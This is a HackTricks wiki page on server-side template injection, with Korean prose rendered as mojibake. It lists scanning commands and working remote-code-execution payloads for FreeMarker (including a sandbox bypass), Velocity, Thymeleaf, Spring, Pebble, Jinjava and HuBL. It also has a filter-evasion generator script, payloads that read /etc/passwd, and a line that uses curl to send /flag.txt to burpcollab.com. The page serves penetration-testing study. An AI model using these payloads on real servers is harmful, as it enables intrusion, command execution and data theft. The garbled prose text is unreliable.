# SSTI (Server Side Template Injection)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (641).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„±ì´ ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ì„ë¬´**ë¥¼ ê°€ì§€ê³  ìˆëŠ” ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì´ ëª¨ì´ëŠ” ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì†Œì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

## What is SSTI (Server-Side Template Injection)

ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì£¼ì…(SSTI)ì€ ê³µê²©ìê°€ ì„œë²„ì—ì„œ ì‹¤í–‰ë˜ëŠ” í…œí”Œë¦¿ì— ì•…ì„± ì½”ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ìˆì„ ë•Œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ Jinjaë¥¼ í¬í•¨í•œ ë‹¤ì–‘í•œ ê¸°ìˆ ì—ì„œ ë°œê²¬ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

JinjaëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì¸ê¸° ìˆëŠ” í…œí”Œë¦¿ ì—”ì§„ì…ë‹ˆë‹¤. Jinjaë¥¼ ì‚¬ìš©í•œ ì·¨ì•½í•œ ì½”ë“œ ì¡°ê°ì„ ë³´ì—¬ì£¼ëŠ” ì˜ˆë¥¼ ê³ ë ¤í•´ ë³´ê² ìŠµë‹ˆë‹¤:
```python
output = template.render(name=request.args.get('name'))
```
ì´ ì·¨ì•½í•œ ì½”ë“œì—ì„œ ì‚¬ìš©ìì˜ ìš”ì²­ìœ¼ë¡œë¶€í„° `name` ë§¤ê°œë³€ìˆ˜ê°€ `render` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ í…œí”Œë¦¿ì— ì§ì ‘ ì „ë‹¬ë©ë‹ˆë‹¤. ì´ëŠ” ê³µê²©ìê°€ `name` ë§¤ê°œë³€ìˆ˜ì— ì•…ì„± ì½”ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì£¼ì…ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, ê³µê²©ìëŠ” ë‹¤ìŒê³¼ ê°™ì€ í˜ì´ë¡œë“œë¥¼ í¬í•¨í•œ ìš”ì²­ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
The payload `{{bad-stuff-here}}`ëŠ” `name` ë§¤ê°œë³€ìˆ˜ì— ì£¼ì…ë©ë‹ˆë‹¤. ì´ í˜ì´ë¡œë“œëŠ” ê³µê²©ìê°€ ë¬´ë‹¨ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê±°ë‚˜ í…œí”Œë¦¿ ì—”ì§„ì„ ì¡°ì‘í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” Jinja í…œí”Œë¦¿ ì§€ì‹œì–´ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìœ¼ë©°, ì ì¬ì ìœ¼ë¡œ ì„œë²„ì— ëŒ€í•œ ì œì–´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì£¼ì… ì·¨ì•½ì ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ê°œë°œìëŠ” ì‚¬ìš©ì ì…ë ¥ì´ í…œí”Œë¦¿ì— ì‚½ì…ë˜ê¸° ì „ì— ì ì ˆí•˜ê²Œ ì •ë¦¬ë˜ê³  ê²€ì¦ë˜ë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤. ì…ë ¥ ê²€ì¦ì„ êµ¬í˜„í•˜ê³  ì»¨í…ìŠ¤íŠ¸ ì¸ì‹ ì´ìŠ¤ì¼€ì´í”„ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì€ ì´ ì·¨ì•½ì ì˜ ìœ„í—˜ì„ ì™„í™”í•˜ëŠ” ë° ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Detection

ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì£¼ì…(SSTI)ì„ íƒì§€í•˜ê¸° ìœ„í•´, ì²˜ìŒì—ëŠ” **í…œí”Œë¦¿ í¼ì§•**ì´ ê°„ë‹¨í•œ ì ‘ê·¼ ë°©ì‹ì…ë‹ˆë‹¤. ì´ëŠ” íŠ¹ìˆ˜ ë¬¸ì ì‹œí€€ìŠ¤(**`${{<%[%'"}}%\`**)ë¥¼ í…œí”Œë¦¿ì— ì£¼ì…í•˜ê³  ì„œë²„ì˜ ì‘ë‹µì—ì„œ ì¼ë°˜ ë°ì´í„°ì™€ ì´ íŠ¹ìˆ˜ í˜ì´ë¡œë“œì˜ ì°¨ì´ë¥¼ ë¶„ì„í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì·¨ì•½ì  ì§€í‘œì—ëŠ” ë‹¤ìŒì´ í¬í•¨ë©ë‹ˆë‹¤:

* ì·¨ì•½ì ì„ ë“œëŸ¬ë‚´ëŠ” ì˜¤ë¥˜ ë°œìƒ ë° ì ì¬ì ìœ¼ë¡œ í…œí”Œë¦¿ ì—”ì§„.
* ë°˜ì‚¬ì—ì„œ í˜ì´ë¡œë“œê°€ ì—†ê±°ë‚˜ ì¼ë¶€ê°€ ëˆ„ë½ë˜ì–´ ì„œë²„ê°€ ì´ë¥¼ ì¼ë°˜ ë°ì´í„°ì™€ ë‹¤ë¥´ê²Œ ì²˜ë¦¬í•¨ì„ ì•”ì‹œ.
* **í‰ë¬¸ ì»¨í…ìŠ¤íŠ¸**: ì„œë²„ê°€ í…œí”Œë¦¿ í‘œí˜„ì‹ì„ í‰ê°€í•˜ëŠ”ì§€ í™•ì¸í•˜ì—¬ XSSì™€ êµ¬ë³„í•©ë‹ˆë‹¤ (ì˜ˆ: `{{7*7}}`, `${7*7}`).
* **ì½”ë“œ ì»¨í…ìŠ¤íŠ¸**: ì…ë ¥ ë§¤ê°œë³€ìˆ˜ë¥¼ ë³€ê²½í•˜ì—¬ ì·¨ì•½ì ì„ í™•ì¸í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `http://vulnerable-website.com/?greeting=data.username`ì—ì„œ `greeting`ì„ ë³€ê²½í•˜ì—¬ ì„œë²„ì˜ ì¶œë ¥ì´ ë™ì  ë˜ëŠ” ê³ ì •ì¸ì§€ í™•ì¸í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `greeting=data.username}}hello`ê°€ ì‚¬ìš©ì ì´ë¦„ì„ ë°˜í™˜í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.

#### Identification Phase

í…œí”Œë¦¿ ì—”ì§„ì„ ì‹ë³„í•˜ê¸° ìœ„í•´ ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ ë¶„ì„í•˜ê±°ë‚˜ ë‹¤ì–‘í•œ ì–¸ì–´ë³„ í˜ì´ë¡œë“œë¥¼ ìˆ˜ë™ìœ¼ë¡œ í…ŒìŠ¤íŠ¸í•©ë‹ˆë‹¤. ì˜¤ë¥˜ë¥¼ ìœ ë°œí•˜ëŠ” ì¼ë°˜ì ì¸ í˜ì´ë¡œë“œì—ëŠ” `${7/0}`, `{{7/0}}`, `<%= 7/0 %>`ê°€ í¬í•¨ë©ë‹ˆë‹¤. ìˆ˜í•™ ì—°ì‚°ì— ëŒ€í•œ ì„œë²„ì˜ ì‘ë‹µì„ ê´€ì°°í•˜ë©´ íŠ¹ì • í…œí”Œë¦¿ ì—”ì§„ì„ íŒŒì•…í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.

## Tools

### [TInjA](https://github.com/Hackmanit/TInjA)

íš¨ìœ¨ì ì¸ SSTI + CSTI ìŠ¤ìºë„ˆë¡œ, ìƒˆë¡œìš´ í´ë¦¬ê¸€ë¡¯ì„ í™œìš©í•©ë‹ˆë‹¤.
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [SSTImap](https://github.com/vladko312/sstimap)
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/" --crawl 5 --forms
python3 sstimap.py -u "https://example.com/page?name=John" -s
```
### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [Template Injection Table](https://github.com/Hackmanit/template-injection-table)

ê°€ì¥ íš¨ìœ¨ì ì¸ í…œí”Œë¦¿ ì¸ì ì…˜ í´ë¦¬ê¸€ë¡¯ê³¼ 44ê°œì˜ ê°€ì¥ ì¤‘ìš”í•œ í…œí”Œë¦¿ ì—”ì§„ì˜ ì˜ˆìƒ ì‘ë‹µì„ í¬í•¨í•˜ëŠ” ì¸í„°ë™í‹°ë¸Œ í…Œì´ë¸”ì…ë‹ˆë‹¤.

## Exploits

### Generic

ì´ **wordlist**ì—ì„œëŠ” ì•„ë˜ì— ì–¸ê¸‰ëœ ì¼ë¶€ ì—”ì§„ì˜ í™˜ê²½ì—ì„œ **ì •ì˜ëœ ë³€ìˆ˜**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
* [https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)

### Java

**Java - ê¸°ë³¸ ì¸ì ì…˜**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```
**Java - ì‹œìŠ¤í…œì˜ í™˜ê²½ ë³€ìˆ˜ ê°€ì ¸ì˜¤ê¸°**
```java
${T(java.lang.System).getenv()}
```
**Java - /etc/passwd ê°€ì ¸ì˜¤ê¸°**
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

ë‹¹ì‹ ì€ [https://try.freemarker.apache.org](https://try.freemarker.apache.org)ì—ì„œ í˜ì´ë¡œë“œë¥¼ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Nothing`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - ìƒŒë“œë°•ìŠ¤ ìš°íšŒ**

âš ï¸ 2.3.30 ì´í•˜ì˜ Freemarker ë²„ì „ì—ì„œë§Œ ì‘ë™í•©ë‹ˆë‹¤.
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**ë” ë§ì€ ì •ë³´**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) ì˜ FreeMarker ì„¹ì…˜
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
// I think this doesn't work
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

// This should work?
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat%20/flag563378e453.txt"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor() )
#foreach($i+in+[1..$out.available()])
$out.read()
#end
```
**ë” ë§ì€ ì •ë³´**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) ì˜ Velocity ì„¹ì…˜
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### íƒ€ì„ë¦¬í”„

íƒ€ì„ë¦¬í”„ì—ì„œ SSTI ì·¨ì•½ì„±ì„ í…ŒìŠ¤íŠ¸í•˜ëŠ” ì¼ë°˜ì ì¸ ë°©ë²•ì€ í‘œí˜„ì‹ `${7*7}`ì´ë©°, ì´ í…œí”Œë¦¿ ì—”ì§„ì—ë„ ì ìš©ë©ë‹ˆë‹¤. ì›ê²© ì½”ë“œ ì‹¤í–‰ ê°€ëŠ¥ì„±ì„ ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ í‘œí˜„ì‹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

*   SpringEL:

```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```
*   OGNL:

```java
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

íƒ€ì„ë¦¬í”„ëŠ” ì´ëŸ¬í•œ í‘œí˜„ì‹ì´ íŠ¹ì • ì†ì„± ë‚´ì— ë°°ì¹˜ë˜ë„ë¡ ìš”êµ¬í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ _í‘œí˜„ì‹ ì¸ë¼ì¸_ì€ `[[...]]` ë˜ëŠ” `[(...)]`ì™€ ê°™ì€ êµ¬ë¬¸ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ í…œí”Œë¦¿ ìœ„ì¹˜ì— ëŒ€í•´ ì§€ì›ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ê°„ë‹¨í•œ SSTI í…ŒìŠ¤íŠ¸ í˜ì´ë¡œë“œëŠ” `[[${7*7}]]`ì™€ ê°™ì´ ë³´ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ì´ í˜ì´ë¡œë“œê°€ ì‘ë™í•  ê°€ëŠ¥ì„±ì€ ì¼ë°˜ì ìœ¼ë¡œ ë‚®ìŠµë‹ˆë‹¤. íƒ€ì„ë¦¬í”„ì˜ ê¸°ë³¸ êµ¬ì„±ì€ ë™ì  í…œí”Œë¦¿ ìƒì„±ì„ ì§€ì›í•˜ì§€ ì•Šìœ¼ë©°, í…œí”Œë¦¿ì€ ë¯¸ë¦¬ ì •ì˜ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ê°œë°œìëŠ” ë¬¸ìì—´ì—ì„œ ì¦‰ì„ìœ¼ë¡œ í…œí”Œë¦¿ì„ ìƒì„±í•˜ê¸° ìœ„í•´ ìì‹ ì˜ `TemplateResolver`ë¥¼ êµ¬í˜„í•´ì•¼ í•˜ë©°, ì´ëŠ” ë“œë­…ë‹ˆë‹¤.

íƒ€ì„ë¦¬í”„ëŠ” ë˜í•œ _í‘œí˜„ì‹ ì „ì²˜ë¦¬_ë¥¼ ì œê³µí•˜ë©°, ì´ì¤‘ ë°‘ì¤„(`__...__`) ë‚´ì˜ í‘œí˜„ì‹ì´ ì „ì²˜ë¦¬ë©ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ íƒ€ì„ë¦¬í”„ ë¬¸ì„œì—ì„œ ë³´ì—¬ì¤€ ê²ƒì²˜ëŸ¼ í‘œí˜„ì‹ êµ¬ì„±ì— í™œìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
#{selection.__${sel.code}__}
```
**Thymeleafì˜ ì·¨ì•½ì  ì˜ˆì‹œ**

ë‹¤ìŒ ì½”ë“œ ì¡°ê°ì„ ê³ ë ¤í•´ ë³´ì‹­ì‹œì˜¤. ì´ëŠ” ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```xml
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
ì´ê²ƒì€ í…œí”Œë¦¿ ì—”ì§„ì´ ì´ëŸ¬í•œ ì…ë ¥ì„ ì˜ëª» ì²˜ë¦¬í•  ê²½ìš°, ë‹¤ìŒê³¼ ê°™ì€ URLì— ì ‘ê·¼í•˜ì—¬ ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤:
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**ë” ë§ì€ ì •ë³´**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### ìŠ¤í”„ë§ í”„ë ˆì„ì›Œí¬ (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**í•„í„° ìš°íšŒ**

ì—¬ëŸ¬ ë³€ìˆ˜ í‘œí˜„ì‹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `${...}`ê°€ ì‘ë™í•˜ì§€ ì•Šìœ¼ë©´ `#{...}`, `*{...}`, `@{...}` ë˜ëŠ” `~{...}`ë¥¼ ì‹œë„í•´ ë³´ì„¸ìš”.

* `/etc/passwd` ì½ê¸°
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* í˜ì´ë¡œë“œ ìƒì„±ì„ ìœ„í•œ ì‚¬ìš©ì ì •ì˜ ìŠ¤í¬ë¦½íŠ¸
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**ì¶”ê°€ ì •ë³´**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### ìŠ¤í”„ë§ ë·° ì¡°ì‘ (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Pebbleì˜ ì´ì „ ë²„ì „ ( < version 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
ìƒˆë¡œìš´ Pebble ë²„ì „:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}





{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
JinjavaëŠ” Hubspotì—ì„œ ê°œë°œí•œ ì˜¤í”ˆ ì†ŒìŠ¤ í”„ë¡œì íŠ¸ë¡œ, [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Jinjava - ëª…ë ¹ ì‹¤í–‰**

[https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)ì—ì„œ ìˆ˜ì •ë¨.
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**ë” ë§ì€ ì •ë³´**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` ë¬¸(statement) êµ¬ë¶„ì
* `{{ }}` í‘œí˜„(expression) êµ¬ë¶„ì
* `{# #}` ì£¼ì„(comment) êµ¬ë¶„ì
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

"com.hubspot.content.hubl.context.TemplateContextRequest"ë¥¼ ê²€ìƒ‰í•˜ê³  [Jinjava í”„ë¡œì íŠ¸ë¥¼ Githubì—ì„œ ë°œê²¬í–ˆìŠµë‹ˆë‹¤](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the



{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**ë” ë§ì€ ì •ë³´**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### í‘œí˜„ ì–¸ì–´ - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

